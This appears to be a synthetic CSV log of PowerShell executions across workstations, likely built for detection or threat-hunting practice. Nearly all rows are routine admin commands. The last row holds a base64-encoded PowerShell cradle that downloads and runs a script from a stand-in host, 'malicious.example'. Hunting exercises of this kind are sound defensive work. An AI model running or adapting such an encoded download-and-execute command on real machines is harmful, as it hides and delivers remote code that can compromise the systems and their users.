@timestamp,event_type,user,computer,command_executed,command_encoded,execution_status
2026-07-20T00:08:00,powershell_execution,SYSTEM,WORKSTATION-017,Get-Process,False,success
2026-07-20T00:42:00,powershell_execution,svc_backup,WORKSTATION-021,Get-Process,False,success
2026-07-20T00:48:00,powershell_execution,jsmith,WORKSTATION-028,Get-Process,False,success
2026-07-20T00:58:00,powershell_execution,jsmith,WORKSTATION-023,Get-Process,False,success
2026-07-20T01:37:00,powershell_execution,svc_backup,WORKSTATION-001,Get-ChildItem C:\Logs,False,success
2026-07-20T02:12:00,powershell_execution,SYSTEM,WORKSTATION-012,Restart-Service Spooler,False,success
2026-07-20T02:35:00,powershell_execution,SYSTEM,WORKSTATION-024,Get-ChildItem C:\Logs,False,success
2026-07-20T03:07:00,powershell_execution,svc_backup,WORKSTATION-034,Get-EventLog -LogName System -Newest 50,False,success
2026-07-20T03:39:00,powershell_execution,jsmith,WORKSTATION-031,Get-Process,False,success
2026-07-20T04:11:00,powershell_execution,jsmith,WORKSTATION-032,Get-Service,False,success
2026-07-20T04:21:00,powershell_execution,admin,WORKSTATION-012,Restart-Service Spooler,False,success
2026-07-20T04:40:00,powershell_execution,SYSTEM,WORKSTATION-038,Get-Process,False,success
2026-07-20T05:01:00,powershell_execution,admin,WORKSTATION-001,Get-EventLog -LogName System -Newest 50,False,success
2026-07-20T05:15:00,powershell_execution,svc_backup,WORKSTATION-024,Get-Service,False,success
2026-07-20T05:48:00,powershell_execution,admin,WORKSTATION-048,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-20T06:24:00,powershell_execution,admin,WORKSTATION-013,Get-ChildItem C:\Logs,False,success
2026-07-20T06:58:00,powershell_execution,SYSTEM,WORKSTATION-045,Get-Process,False,success
2026-07-20T07:36:00,powershell_execution,svc_backup,WORKSTATION-011,Get-EventLog -LogName System -Newest 50,False,success
2026-07-20T07:43:00,powershell_execution,SYSTEM,WORKSTATION-038,Restart-Service Spooler,False,success
2026-07-20T08:05:00,powershell_execution,SYSTEM,WORKSTATION-045,Get-ChildItem C:\Logs,False,success
2026-07-20T08:35:00,powershell_execution,svc_backup,WORKSTATION-006,Get-Service,False,success
2026-07-20T08:50:00,powershell_execution,SYSTEM,WORKSTATION-049,Get-ChildItem C:\Logs,False,success
2026-07-20T09:03:00,powershell_execution,svc_backup,WORKSTATION-035,Get-Service,False,success
2026-07-20T09:34:00,powershell_execution,svc_backup,WORKSTATION-048,Get-Process,False,success
2026-07-20T10:14:00,powershell_execution,svc_backup,WORKSTATION-010,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-20T10:50:00,powershell_execution,svc_backup,WORKSTATION-005,Get-ChildItem C:\Logs,False,success
2026-07-20T11:05:00,powershell_execution,svc_backup,WORKSTATION-048,Get-EventLog -LogName System -Newest 50,False,success
2026-07-20T11:35:00,powershell_execution,admin,WORKSTATION-030,Get-Process,False,success
2026-07-20T11:54:00,powershell_execution,SYSTEM,WORKSTATION-022,Restart-Service Spooler,False,success
2026-07-20T12:21:00,powershell_execution,svc_backup,WORKSTATION-021,Get-Process,False,success
2026-07-20T12:51:00,powershell_execution,jsmith,WORKSTATION-025,Get-Process,False,success
2026-07-20T13:23:00,powershell_execution,jsmith,WORKSTATION-010,Restart-Service Spooler,False,success
2026-07-20T13:53:00,powershell_execution,SYSTEM,WORKSTATION-035,Get-ChildItem C:\Logs,False,success
2026-07-20T14:10:00,powershell_execution,jsmith,WORKSTATION-004,Get-Service,False,success
2026-07-20T14:38:00,powershell_execution,admin,WORKSTATION-025,Restart-Service Spooler,False,success
2026-07-20T15:14:00,powershell_execution,admin,WORKSTATION-010,Get-Process,False,success
2026-07-20T15:28:00,powershell_execution,admin,WORKSTATION-021,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-20T15:56:00,powershell_execution,svc_backup,WORKSTATION-036,Get-Process,False,success
2026-07-20T16:25:00,powershell_execution,SYSTEM,WORKSTATION-002,Restart-Service Spooler,False,success
2026-07-20T16:58:00,powershell_execution,jsmith,WORKSTATION-014,Get-EventLog -LogName System -Newest 50,False,success
2026-07-20T17:38:00,powershell_execution,jsmith,WORKSTATION-007,Restart-Service Spooler,False,success
2026-07-20T17:55:00,powershell_execution,SYSTEM,WORKSTATION-008,Get-Process,False,success
2026-07-20T18:03:00,powershell_execution,svc_backup,WORKSTATION-028,Get-ChildItem C:\Logs,False,success
2026-07-20T18:28:00,powershell_execution,SYSTEM,WORKSTATION-033,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-20T18:48:00,powershell_execution,admin,WORKSTATION-002,Get-Process,False,success
2026-07-20T19:10:00,powershell_execution,jsmith,WORKSTATION-004,Get-Service,False,success
2026-07-20T19:35:00,powershell_execution,jsmith,WORKSTATION-001,Get-EventLog -LogName System -Newest 50,False,success
2026-07-20T20:14:00,powershell_execution,jsmith,WORKSTATION-003,Get-ChildItem C:\Logs,False,success
2026-07-20T20:36:00,powershell_execution,admin,WORKSTATION-031,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-20T20:41:00,powershell_execution,SYSTEM,WORKSTATION-019,Get-ChildItem C:\Logs,False,success
2026-07-20T20:49:00,powershell_execution,SYSTEM,WORKSTATION-048,Restart-Service Spooler,False,success
2026-07-20T21:09:00,powershell_execution,svc_backup,WORKSTATION-017,Get-ChildItem C:\Logs,False,success
2026-07-20T21:14:00,powershell_execution,admin,WORKSTATION-032,Get-EventLog -LogName System -Newest 50,False,success
2026-07-20T21:52:00,powershell_execution,svc_backup,WORKSTATION-011,Get-ChildItem C:\Logs,False,success
2026-07-20T22:24:00,powershell_execution,SYSTEM,WORKSTATION-024,Get-Process,False,success
2026-07-20T22:41:00,powershell_execution,svc_backup,WORKSTATION-044,Get-Process,False,success
2026-07-20T23:06:00,powershell_execution,svc_backup,WORKSTATION-008,Restart-Service Spooler,False,success
2026-07-20T23:10:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
